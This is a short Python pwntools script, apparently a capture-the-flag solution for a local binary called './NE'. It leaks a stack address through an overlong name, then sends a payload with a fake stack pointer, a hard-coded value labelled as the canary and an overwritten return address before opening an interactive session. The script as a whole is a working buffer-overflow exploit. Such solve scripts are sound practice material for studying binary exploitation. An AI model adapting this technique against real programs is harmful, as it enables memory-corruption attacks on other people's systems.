from pwn import *
context.log_level = "debug"
p = process("./NE")
# pause(2)
#connect with  gdb -q -p $(pidof ./chall) [im writing ts here cuz i always forget how to]


p.sendafter(b"Cleric: what should we call you? ",32*b"A") #dont use sendlineafter cuz the extra \n will terminate the next fgets()
leak = p.recvuntil("DM: Your party")
leak = leak[63:]
leak = leak[:-14]
leak = u64(leak.ljust(8, b'\x00')) #+0x48 of RSP right before returning from encounter()
canary = p64(0x401473) #canary offset at 40
padding = 32*b"C"
fakestack = p64(leak-0x30)
payload1 = 32*b"A"+ fakestack + canary + 24*b"C" + p64(0x0000000000401206)
p.sendlineafter("You do: ",payload1)
print(hex(leak))
p.interactive()


